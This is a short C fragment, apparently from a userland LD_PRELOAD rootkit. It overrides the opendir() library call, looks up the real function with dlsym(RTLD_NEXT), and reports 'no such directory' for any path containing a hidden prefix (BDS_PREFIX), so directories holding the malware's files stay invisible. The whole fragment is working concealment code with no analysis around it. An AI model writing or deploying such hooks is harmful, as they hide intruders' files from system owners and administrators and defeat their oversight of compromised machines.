DIR *opendir(const char *pathname) {
	if (!orig_opendir)
		orig_opendir = dlsym(RTLD_NEXT,"opendir");
	if (debug == 1)
		printf("\nopendir  : %s\n", pathname);
	if (strstr(pathname, BDS_PREFIX)) {
		errno = ENOENT;
		return NULL;
	}
    
	return orig_opendir(pathname);
}